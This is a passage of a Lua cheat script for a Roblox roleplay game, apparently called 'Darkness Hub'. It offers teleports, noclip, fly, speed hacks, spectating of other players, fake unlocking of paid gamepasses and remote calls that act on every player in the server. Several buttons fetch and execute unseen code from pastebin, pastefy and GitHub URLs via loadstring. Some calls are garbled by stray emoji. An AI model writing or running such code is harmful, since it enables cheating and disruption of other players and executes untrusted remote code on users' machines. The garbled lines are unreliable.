      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(136, 4, 117)
  end
 
  AddButton(Main, {
      Name = "In front of houses",
      Description = "",
      Callback = teleportToCenter
  })
 
  -- Function to teleport to Criminal
  local function teleportToCriminal()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-119, -28, 235)
  end
 
  AddButton(Main, {
      Name = "Weapons place",
      Description = "Teleport to Criminal coordinates",
      Callback = teleportToCriminal
  })
 
  -- Function to teleport to House Abandoned
  local function teleportToHouseAbandoned()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(986, 4, 63)
  end
 
  AddButton(Main, {
      Name = "Abandoned house",
      Description = "Teleport to Abandoned House coordinates",
      Callback = teleportToHouseAbandoned
  })
 
  -- Function to teleport to Portal Agency
  local function teleportToPortalAgency()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(672, 4, -296)
  end
 
  AddButton(Main, {
      Name = "Secret place",
      Description = "Teleport to Agency Portal coordinates",
      Callback = teleportToPortalAgency
  })
 
  -- Function to teleport to Secret Location
  local function teleportToSecretLocation()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(505, -75, 143)
  end
 
  AddButton(Main, {
      Name = "Under the ground1",
      Description = "Teleport to Secret Location coordinates",
      Callback = teleportToSecretLocation
  })
 
  -- Function to teleport to School
  local function teleportToSchool()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-312, 4, 211)
  end
 
  AddButton(Main, {
      Name = "At school",
      Description = "Teleport to School coordinates",
      Callback = teleportToSchool
  })
 
  -- Function to teleport to Brooks Diner
  local function teleportToBrooksDiner()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(161, 8, 52)
  end
 
  AddButton(Main, {
      Name = "At the cafe",
      Description = "Teleport to Brooks Diner coordinates",
      Callback = teleportToBrooksDiner
  })
 
  local function teleportToBrooksDiner()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-26, 4, -23)
  end
 
  AddButton(Main, {
      Name = "Start",
      Description = "Teleport to Brooks Diner coordinates",
      Callback = teleportToBrooksDiner
  })
 
 
  -- Function to teleport to Hospital
  local function teleportToHospital()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-309, 4, 71)
  end
 
  AddButton(Main, {
      Name = "At hospital",
      Description = "Teleport to Hospital coordinates",
      Callback = teleportToHospital
  })
  -- Function to teleport to Secret Room 2
  local function teleportToSecretRoom2()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-343, 4, -613)
  end
 
  AddButton(Main, {
      Name = "Under the ground2",
      Description = "Teleport to Secret Room 2 coordinates",
      Callback = teleportToSecretRoom2
  })
 
  -- Function to teleport to Island 1
  local function teleportToIsland1()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1925, 23, 127)
  end
 
  AddButton(Main, {
      Name = "At the island",
      Description = "Teleport to Island 1 coordinates",
      Callback = teleportToIsland1
  })
 
  -- Function to teleport to Airport
  local function teleportToAirport()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(310, 5, 31)
  end
 
  AddButton(Main, {
      Name = "At airport",
      Description = "Teleport to Airport coordinates",
      Callback = teleportToAirport
  })
 
  -- Function to teleport to Arch
  local function teleportToArch()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-589, 141, -59)
  end
 
  AddButton(Main, {
      Name = "Above the bridge",
      Description = "Teleport to Arch coordinates",
      Callback = teleportToArch
  })
 
  -- Function to teleport to Agency
  local function teleportToAgency()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(179, 4, -464)
  end
 
  AddButton(Main, {
 
  Name = "Generator place",
      Description = "Teleport to Agency coordinates",
      Callback = teleportToAgency
  })
  local Main = MakeTab({Name = " Heads and Legs "})
--[[
  Name = "Main" <string> Tab name
]]
local Paragraph = AddParagraph(Main, {"Heads"})
AddButton(Main, {
  Name = "Robot Head",
  Callback = function()
    local args = {
    [1] = 3210773801
}
game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))
  end
})
--[[
  Name = "Test Button" <string> your button name
  Callback = function()
    -- your button function
  end
]]
AddButton(Main, {
  Name = "Hidden Head ",
  Callback = function()
    local args = {
    [1] = 134082579
}
game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))
  end
})
--[[
  Name = "Test Button" <string> your button name
  Callback = function()
    -- your button function
  end
]]
AddButton(Main, {
  Name = "Copy Head | Roll",
  Callback = function()
    local args = {
    [1] = 746767604
}
game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))
  end
})
--[[
  Name = "Test Button" <string> your button name
  Callback = function()
    -- your button function
  end
]]
AddButton(Main, {
  Name = "Blue Eyes ",
  Callback = function()
    local args = {
    [1] = 16580493236
}
game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))
  end
})
--[[
  Name = "Test Button" <string> your button name
  Callback = function()
    -- your button function
  end
]]
local Paragraph = AddParagraph(Main, {"<Roblox Legs>"})
AddButton(Main, {
  Name = "Left Leg",
  Callback = function()
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 139607673,
        [6] = 1
    },
    [3] = "by:REDz"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Right Leg",
  Callback = function()
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 139607718,
        [5] = 1,
        [6] = 1
    },
    [3] = "by:REDz"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
  end
})
local Paragraph = AddParagraph(Main, {"Various Legs"})
AddButton(Main, {
  Name = "White Muscular Leg",
  Callback = function()
    local args = {
    [1] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 14580308646,
        [5] = 1,
        [6] = 1
    }
}
game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
  end
})
--[[
  Name = "Test Button" <string> your button name
  Callback = function()
    -- your button function
  end
]]
AddButton(Main, {
  Name = "Black Muscular Leg",
  Callback = function()
    local args = {
    [1] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 14547162578,
        [5] = 1,
        [6] = 1
    }
}
game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
  end
})
--[[
  Name = "Test Button" <string> your button name
  Callback = function()
    -- your button function
  end
]]
AddButton(Main, {
  Name = "Roll Legs ",
  Callback = function()
    local args = {
    [1] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 3230472745,
        [5] = 3230470862,
        [6] = 1
    }
}
game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
  end
})
--[[
  Name = "Test Button" <string> your button name
  Callback = function()
    -- your button function
  end
]]
AddButton(Main, {
  Name = "Iron Leg",
  Callback = function()
    local args = {
    [1] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 17500249989,
        [5] = 1,
        [6] = 1
    }
}
game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
  end
})
--[[
  Name = "Test Button" <string> your button name
  Callback = function()
    -- your button function
  end
]]
local Main = MakeTab({Name = "{Player | Player} "})
AddTextBox(Main, {
  Name = "Speed | Speed",
  Default = "",
  PlaceholderText = "Enter number",
  ClearText = true,
  Callback = function(value)
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = value
 end
})
AddTextBox(Main, {
  Name = "Jump | Jump",
  Default = "",
  PlaceholderText = "Enter number",
  ClearText = true,
  Callback = function(value)
game.Players.LocalPlayer.Character.Humanoid.JumpPower = value
  end
})
AddTextBox(Main, {
  Name = "Fov | Screen",
  Default = "",
  PlaceholderText = "Enter number",
  ClearText = true,
  Callback = function(value)
local FovNumber = value
local Camera = workspace.CurrentCamera
Camera.FieldOfView = FovNumber
  end
})
AddTextBox(Main, {
  Name = "Spin | Rotation",
  Default = "",
  PlaceholderText = "Enter number",
  ClearText = true,
  Callback = function(Value)
    getgenv().Spinspeed = Value
local Spin = Instance.new'BodyAngularVelocity'
Spin.Parent = game:GetService'Players'.LocalPlayer.Character:FindFirstChild'HumanoidRootPart'
Spin.MaxTorque = Vector3.new(0, math.huge, 100)
wait(0.1)
Spin.AngularVelocity = Vector3.new(100,Spinspeed,0)
  end
})
AddButton(Main, {
  Name = "Couch | Couch",
  Callback = function()
    local args={[1]="PickingTools",[2]="Couch"};game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Fly on Couch",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
  end
})
local infiniteJumpEnabled = false
-- Connect the jump event only once
local infiniteJumpConnection
-- Callback function for the infinite jump toggle button
local function onInfiniteJumpToggle(value)
    infiniteJumpEnabled = value
    print("Infinite Jump Enabled:", infiniteJumpEnabled)
   
    -- Connect the jump event only once
    if not infiniteJumpConnection then
        infiniteJumpConnection = game:GetService("UserInputService").JumpRequest:Connect(function()
            if infiniteJumpEnabled then
                local player = game.Players.LocalPlayer
                local character = player.Character
                if character and character:FindFirstChildOfClass("Humanoid") then
                    character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
                end
            end
        end)
    end
end
-- Add the "Infinitejump" toggle button
local Toggle = AddToggle(Main, {
    Name = "Infinite Jump | Inf Jump",
    Default = false,
    Callback = onInfiniteJumpToggle
})
function MakeNotifi(notification)
    game.StarterGui:SetCore("SendNotification", {
        Title = notification.Title;
        Text = notification.Text;
        Duration = notification.Time;
    })
end
function MakeNotifi(notification)
    game.StarterGui:SetCore("SendNotification", {
        Title = notification.Title;
        Text = notification.Text;
        Duration = notification.Time;
    })
end
-- Variables and functions for viewing players
local viewEnabled = false
local selectedViewPlayer = nil
local characterAddedConnection = nil
local function toggleView(enabled)
    if enabled then
        if selectedViewPlayer then
            local player = selectedViewPlayer
            if player then
                game.Workspace.CurrentCamera.CameraSubject = player.Character
                if characterAddedConnection then
                    characterAddedConnection😀isconnect()
                end
                characterAddedConnection = player.CharacterAdded:Connect(function(character)
                    game.Workspace.CurrentCamera.CameraSubject = character
                end)
                MakeNotifi({
                    Title = "Viewing " .. player.Name,
                    Text = "You are viewing the player: " .. player.Name,
                    Time = 6
                })
            else
                print("Player not found.")
                viewEnabled = false
            end
        else
            print("No player selected for viewing.")
            viewEnabled = false
        end
    else
        if characterAddedConnection then
            characterAddedConnection😀isconnect()
            characterAddedConnection = nil
        end
        game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
    end
end
local value = "" -- Variable to store the entered name
local function findPlayerByPartialNameOrNickname(partialName)
    value = partialName -- Update the variable with the full entered name
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player.Name:lower():find(partialName:lower(), 1, true) or (player.DisplayName and player.DisplayName:lower():find(partialName:lower(), 1, true)) then
            return player
        end
    end
    return nil
end
-- Adding the text box for entering the player's name or nickname
AddTextBox(Main, {
    Name = " Enter the first three letters of the player's name",
    Default = "",
    PlaceholderText = "Enter player name",
    ClearText = true,
    Callback = function(value)
        if value == "" then
            MakeNotifi({
                Title = "Error",
                Text = "Player name was not entered.",
                Time = 5
            })
            if viewEnabled then
                toggleView(false)
            end
            return
        end
        selectedViewPlayer = findPlayerByPartialNameOrNickname(value)
        if selectedViewPlayer then
            print("Player found: " .. selectedViewPlayer.Name)
            if viewEnabled then
                toggleView(false)
                toggleView(true)
            end
        else
            MakeNotifi({
                Title = "Error",
                Text = "No player found with that name or nickname.",
                Time = 7
            })
            if viewEnabled then
                toggleView(false)
            end
        end
    end
})
-- Adding the toggle to enable/disable viewing
AddToggle(Main, {
    Name = "Watch | View",
    Default = false,
    Callback = function(enabled)
        viewEnabled = enabled
        toggleView(enabled)
    end
})
-- Connecting player removal events
game.Players.PlayerRemoving:Connect(function(player)
    if selectedViewPlayer == player then
        selectedViewPlayer = nil
        if viewEnabled then
            toggleView(false)
            MakeNotifi({
                Title = "Player Left",
                Text = player.Name .. " left the game. Viewing disabled.",
                Time = 5
            })
        end
    end
end)
-- Function to keep the camera on the selected player
local function maintainView()
    while wait() do
        if viewEnabled and selectedViewPlayer then
            local player = selectedViewPlayer
            if player and game.Workspace.CurrentCamera.CameraSubject ~= player.Character then
                game.Workspace.CurrentCamera.CameraSubject = player.Character
            end
        end
    end
end
AddButton(Main, {
  Name = "Player Disappear",
  Callback = function()
    local args = {
    [1] = "CharacterSizeUp",
    [2] = 6
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Cancel Disappear",
  Callback = function()
    local args = {
    [1] = "CharacterSizeUp",
    [2] = 1
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clothe1s"):FireServer(unpack(args))
  end
})
-- Variable to control Noclip state
local noclipEnabled = false
local runService = game:GetService("RunService")
-- Function to set CanCollide for all character parts
local function setCharacterCanCollide(character, canCollide)
    for _, part in ipairs(character:GetDescendants()) do
        if part:IsA("BasePart") then
            part.CanCollide = canCollide
        end
    end
end
-- Callback function for the Noclip toggle button
local function onNoclipToggle(value)
    noclipEnabled = value
    print("Noclip Enabled:", noclipEnabled)
   
    local player = game.Players.LocalPlayer
    local character = player.Character
    if noclipEnabled then
        -- Start a loop to continuously set CanCollide
        noclipLoop = runService.Stepped:Connect(function()
            if character then
                setCharacterCanCollide(character, false)
            end
        end)
    else
        -- Disable the loop and restore CanCollide
        if noclipLoop then
            noclipLoop😀isconnect()
        end
        if character then
            setCharacterCanCollide(character, true)
        end
    end
end
-- Add the "Noclip" toggle button
local Toggle = AddToggle(Main, {
    Name = " Wall Penetration",
    Default = false,
    Callback = onNoclipToggle
})
AddButton(Main, {
    Name = "Fly",
    Callback = function()
      loadstring(game:HttpGet('https://raw.githubusercontent.com/MrLamon/JANA/refs/heads/main/Protected_8698456571734398.txt'))()
    end
  })
AddButton(Main, {
  Name = " lock | Lock",
  Callback = function()
    loadstring(game:HttpGet('https://pastebin.com/raw/gSrbeNsB'))()
  end
})
local Paragraph = AddParagraph(Main, {"Useful | Useful"})
AddButton(Main, {
  Name = " Rejoin server | Rejoin",
  Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/j2ex7NdF"))()
  end
})
AddButton(Main, {
  Name = "Delete all things in your hand",
  Callback = function()
    local args = {
    [1] = "ClearAllTools"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Kill yourself",
  Callback = function()
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
  end
})
AddButton(Main, {
  Name = "Remove Lag • Destroy Lag",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua"))()
  end
})
AddSection(Main, {"Server"})
       
        AddButton(Main, {
            Name = "Click here to know how many in the server",
            Callback = function()
                -- Get player count
                local playerCount = #game:GetService("Players"):GetPlayers()
                local maxPlayers = game:GetService("Players").MaxPlayers
               
                -- Show notification with player count
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "Number of Players",
                    Text = playerCount .. " / " .. maxPlayers .. " players in the server",
                    Duration = 5
                })
               
                -- Optional: Update when players join/leave
                game:GetService("Players").PlayerAdded:Connect(function()
                    playerCount = #game:GetService("Players"):GetPlayers()
                end)
               
                game:GetService("Players").PlayerRemoving:Connect(function()
                    playerCount = #game:GetService("Players"):GetPlayers()
                end)
            end
        })
local Main = MakeTab({Name = "{Car} "})
 
  AddTextBox(Main, {
  Name = "Car Speed",
  Default = "",
  TextDisappear = true,
  Callback = function(value)
  CarSpeed = tonumber(value)
  end
  })
  AddButton(Main, {
  Name = "Activate Speed",
  Callback = function()
  local args = {
  [1] = "PlayerGiveSpeedLower",
  [2] = CarSpeed
  }
 
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
  end
  })
  AddButton(Main, {
   Name = "Sound on Bus",
   Callback = function()
          local plr = game.Players.LocalPlayer
  local char = plr.Character
  local hrp = char.HumanoidRootPart
 
  hrp.CFrame = CFrame.new(-24.741954803466797, 3.0249993801116943, -66.39078521728516)
  wait(0.1)
  local args = {
      [1] = "PickingCar",
      [2] = "SchoolBus"
  }
 
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
  wait(1)
   local plr = game.Players.LocalPlayer
  local char = plr.Character
  local hrp = char.HumanoidRootPart
 
  hrp.CFrame = CFrame.new(-35.15000534057617, 5.7094035148620605, -74.16535949707031)
  wait(0.1)
  local args = {
      [1] = "PickingCarMusicText",
      [2] = "892233254"
  }
 
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
     end
  })
 
  AddButton(Main, {
    Name = "Car Fly",
    Callback = function()
      Loadstring(game:HttpGet("https://raw.githubusercontent.com/hasan08122020108181818/HASA/759cc1030d8a4f4c23b32e8cb8550b47f567d1b9/carflyronald"))()
    end
  })
  AddButton(Main, {
    Name = "Fire on Car",
    Callback = function()
      local args = {
      [1] = "Fire"
  }
  
  game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sCa1r"):FireServer(unpack(args))
    end
  })
  AddButton(Main, {
    Name = "Smoke on Car",
    Callback = function()
      local args = {
      [1] = "Smoke"
  }
  
  game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sCa1r"):FireServer(unpack(args))
    end
  })
 
  AddButton(Main, {
    Name = "Change Car Tire",
    Callback = function()
   local args = {
   [1] = "WheelNumber"
   }
   game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sCa1r"):FireServer(unpack(args))
  
  end
  })
 
 
  AddButton(Main, {
    Name = "First Car Burn",
    Callback = function()
   local args = {
   [1] = "Duke"
   }
   game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sCa1r"):FireServer(unpack(args))
 
  end
  })
 
 
 
 
  AddButton(Main, {
    Name = "Second Car Burn",
    Callback = function()
   local args = {
   [1] = "Duke1"
   }
   game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sCa1r"):FireServer(unpack(args))
  end
  })
 
 
 
  AddButton(Main, {
    Name = " Automatic Colored Car",
    Callback = function()
   local args = {
   [1] = "PickingCarColor",
   [2] = Color3.new(math.random(), math.random(), math.random()) -- Random color
   }
  
   -- Fire the remote event
   game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
 
  end
  })
  AddSection(Main, {"Horses🐎"})
   Name = "Horses🐎"
  AddButton(Main, {
   Name = "Pull All Horses🐎",
   Callback = function()
         local players = game:GetService("Players")
  
  for _, player in pairs(players:GetPlayers()) do
      local args = {
          [1] = player
      }
  
      game:GetService("ReplicatedStorage").RE:FindFirstChild("1Hors1eRemot1e"):FireServer(unpack(args))
  end
     end
  })
  AddButton(Main, {
   Name = "Cut the Horse 🐎",
   Callback = function()
         local args = {
      [1] = "PickingCar",
      [2] = "Horse"
  }
  
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
  wait(0.5) do
  local args = {
      [1] = game:GetService("Players").LocalPlayer
  }
  
  game:GetService("ReplicatedStorage").RE:FindFirstChild("1Hors1eRemot1e"):FireServer(unpack(args))
  end
  wait(0.9) do
  -- Reference the player
  local player = game.Players.LocalPlayer
  
  -- Check if the character already exists
  if player.Character then
      player.Character:BreakJoints() -- Reset the character immediately
  end
  
  -- Listen for future character spawns and reset
  player.CharacterAdded:Connect(function(character)
      character:BreakJoints() -- Reset the character whenever it spawns
  end)
  end
     end
  })
  local Main = MakeTab({Name = " Gamepass"})
  local Paragraph = AddParagraph(Main, {" Think it will show to people only ", "good morning my brothers"})
 
  AddButton(Main, {
    Name = "VIP",
    Desc = "", -- Optional
    Callback = function()
  local lib = {
   ['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
   ['cooldown'] = false,
   ['username'] = 'unknown',
   ['bw'] = 'unknown'
  }
 
  lib.notification:message{
   Name = "Darkness Hub Notification",
   Description = "Got Vip Gamepass!",
   Icon = 85102932341647
  }
   game:GetService("Players").LocalPlayer.PlayersBag.VIP.Value = true
    end
  })
  AddButton(Main, {
    Name = "Premium Gamepass",
    Desc = "", -- Optional
    Callback = function()
  local lib = {
   ['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
   ['cooldown'] = false,
   ['username'] = 'unknown',
   ['bw'] = 'unknown'
  }
 
  lib.notification:message{
   Name = "Darkness Hub Notification",
   Description = "Got Premium Gamepass!",
   Icon = 100893456751976
  }
  game:GetService("Players").LocalPlayer.PlayersBag.SilverPass.Value = true
    end
  })
  AddButton(Main, {
    Name = "Speed Gamepass",
    Desc = "", -- Optional
    Callback = function()
   local lib = {
   ['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
   ['cooldown'] = false,
   ['username'] = 'unknown',
   ['bw'] = 'unknown'
  }
 
  lib.notification:message{
   Name = "Darkness Hub Notification",
   Description = "Got Speed Gamepass!",
   Icon = 127553905855586
  }
   game:GetService("Players").LocalPlayer.PlayersBag.SpeedPass200.Value = true
    end
  })
  AddButton(Main, {
    Name = "Music Gamepass",
    Desc = "", -- Optional
    Callback = function()
  local lib = {
   ['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
   ['cooldown'] = false,
   ['username'] = 'unknown',
   ['bw'] = 'unknown'
  }
 
  lib.notification:message{
   Name = "Darkness Hub Notification",
   Description = "Got Music Gamepass!",
   Icon = 77765073982300
  }
   game:GetService("Players").LocalPlayer.PlayersBag.MusicPass.Value = true
    end
  })
  AddButton(Main, {
    Name = "Horse Gamepass",
    Desc = "", -- Optional
    Callback = function()
   local lib = {
   ['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
   ['cooldown'] = false,
   ['username'] = 'unknown',
   ['bw'] = 'unknown'
  }
 
  lib.notification:message{
   Name = "Darkness Hub Notification",
   Description = "Got Horse Gamepass!",
   Icon = 127553905855586
  }
   game:GetService("Players").LocalPlayer.PlayersBag.HorsePass.Value = true
    end
  })
  AddButton(Main, {
    Name = "VehiclePack Gamepass",
    Desc = "", -- Optional
    Callback = function()
   local lib = {
   ['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
   ['cooldown'] = false,
   ['username'] = 'unknown',
   ['bw'] = 'unknown'
  }
 
  lib.notification:message{
   Name = "Darkness Hub Notification",
   Description = "Got VehiclePack Gamepass!",
   Icon = 127553905855586
  }
   game:GetService("Players").LocalPlayer.PlayersBag.VehiclePackPass.Value = true
    end
  })
  AddButton(Main, {
    Name = "Mansion Gamepass",
    Desc = "", -- Optional
    Callback = function()
   local lib = {
   ['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
   ['cooldown'] = false,
   ['username'] = 'unknown',
   ['bw'] = 'unknown'
  }
 
  lib.notification:message{
   Name = "Darkness Hub Notification",
   Description = "Got Mansion Gamepass!",
   Icon = 127553905855586
  }
   game:GetService("Players").LocalPlayer.PlayersBag.MansionPass.Value = true
    end
  })
  AddButton(Main, {
    Name = "Face Gamepass",
    Desc = "", -- Optional
    Callback = function()
   local lib = {
   ['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
   ['cooldown'] = false,
   ['username'] = 'unknown',
   ['bw'] = 'unknown'
  }
 
  lib.notification:message{
   Name = "Darkness Hub Notification",
   Description = "Got Face Gamepass!",
   Icon = 127553905855586
  }
   game:GetService("Players").LocalPlayer.PlayersBag.FacePass.Value = true
    end
  })
  AddButton(Main, {
    Name = "Disaster Gamepass",
    Desc = "", -- Optional
    Callback = function()
   local lib = {
   ['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
   ['cooldown'] = false,
   ['username'] = 'unknown',
   ['bw'] = 'unknown'
  }
 
  lib.notification:message{
   Name = "Darkness Hub Notification",
   Description = "Got Disaster Gamepass!",
   Icon = 127553905855586
  }
   game:GetService("Players").LocalPlayer.PlayersBag.DisasterPass.Value = true
    end
  })
  AddButton(Main, {
    Name = "Boat Gamepass",
    Desc = "", -- Optional
    Callback = function()
   local lib = {
   ['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
   ['cooldown'] = false,
   ['username'] = 'unknown',
   ['bw'] = 'unknown'
  }
 
  lib.notification:message{
   Name = "Darkness Hub Notification",
   Description = "Got Boat Gamepass!",
   Icon = 127553905855586
  }
   game:GetService("Players").LocalPlayer.PlayersBag.BoatPass.Value = true
    end
  })
  AddButton(Main, {
    Name = "PentHouse Gamepass",
    Desc = "", -- Optional
    Callback = function()
   local lib = {
   ['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
   ['cooldown'] = false,
   ['username'] = 'unknown',
   ['bw'] = 'unknown'
  }
 
  lib.notification:message{
   Name = "Darkness Hub Notification",
   Description = "Got PentHouse Gamepass!",
   Icon = 127553905855586
  }
   game:GetService("Players").LocalPlayer.PlayersBag.PenthousePass.Value = true
    end
  })
  AddButton(Main, {
    Name = "Fire Gamepass",
    Desc = "", -- Optional
    Callback = function()
   local lib = {
   ['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
   ['cooldown'] = false,
   ['username'] = 'unknown',
   ['bw'] = 'unknown'
  }
 
  lib.notification:message{
   Name = "Darkness Hub Notification",
   Description = "Got Fire Gamepass!",
   Icon = 127553905855586
  }
   game:GetService("Players").LocalPlayer.PlayersBag.FirePass.Value = true
    end
  })
  AddButton(Main, {
   Name = "Theme Gamepass",
    Desc = "", -- Optional
    Callback = function()
   local lib = {
   ['notification'] = loadstring(game:HttpGetAsync("https://pastefy.app/nXmxy6M0/raw"))(),
   ['cooldown'] = false,
   ['username'] = 'unknown',
   ['bw'] = 'unknown'
  }
 
  lib.notification:message{
   Name = "Darkness Hub Notification",
   Description = "Got Theme Gamepass!",
   Icon = 127553905855586
  }
   game:GetService("Players").LocalPlayer.PlayersBag.ThemePass.Value = true
    end
  })
 local Main = MakeTab({Name = "😌Notifications※"})
local section = AddSection(Main, {"You can see notifications who left or entered"})
-- Global variable to track notification state
_G.NotificationsEnabled = true
-- Function to show notification if enabled
local function ShowNotification(title, text, duration)
    if _G.NotificationsEnabled then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = title,
            Text = text,
            Duration = duration or 3
        })
    end
end
-- Handle player joining
game.Players.PlayerAdded:Connect(function(player)
    ShowNotification(
        "Player Join",
        player.Name .. " entered the game"
    )
end)
-- Handle player leaving
game.Players.PlayerRemoving:Connect(function(player)
    ShowNotification(
        "Player Leave",
        player.Name .. " left the game"
    )
end)
-- Toggle for join/leave notifications
AddToggle(Main, {
    Name = "Join and Leave Notifications",
    Default = true,
    Callback = function(Value)
        _G.NotificationsEnabled = Value
    end
})
-- Toggle for game notifications
AddToggle(Main, {
    Name = "System Notifications",
    Default = true,
    Callback = function(Value)
        _G.SystemNotificationsEnabled = Value
       
        -- Example system notification when toggled
        if Value then
            ShowNotification(
                "System",
                "System notifications enabled",
                5
            )
        end
    end
})
local Main = MakeTab({Name = "★Bodies★"})
AddButton(Main, {
  Name = "Girl Body ",
  Callback = function()
local args = {
    [1] = {
        [1] = 74302534603111,
        [2] = 76683091425509,
        [3] = 75159926897589,
        [4] = 1,
        [5] = 1,
        [6] = 1
    }
}
game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Girl Body",
  Callback = function()
local args = {
    [1] = {
        [1] = 96491916349570,
        [2] = 14854350570,
        [3] = 14854350451,
        [4] = 1,
        [5] = 1,
        [6] = 1
    }
}
game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Girl Body🔥 ",
  Callback = function()
local args = {
    [1] = {
        [1] = 16214246112,
        [2] = 16214249513,
        [3] = 16214251181,
        [4] = 1,
        [5] = 1,
        [6] = 1
    }
}
game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Girl Body",
  Callback = function()
local args = {
    [1] = {
        [1] = 15539008532,
        [2] = 15539008875,
        [3] = 15539008680,
        [4] = 15539008795,
        [5] = 15539011945,
        [6] = 1
    }
}
game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Girl Body",
  Callback = function()
local args = {
    [1] = {
        [1] = 14861800638,
        [2] = 14861800626,
        [3] = 14861801452,
        [4] = 14861800627,
        [5] = 14861801454,
        [6] = 1
    }
}
game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "🖤Boy Body🖤",
  Callback = function()
local args = {
    [1] = {
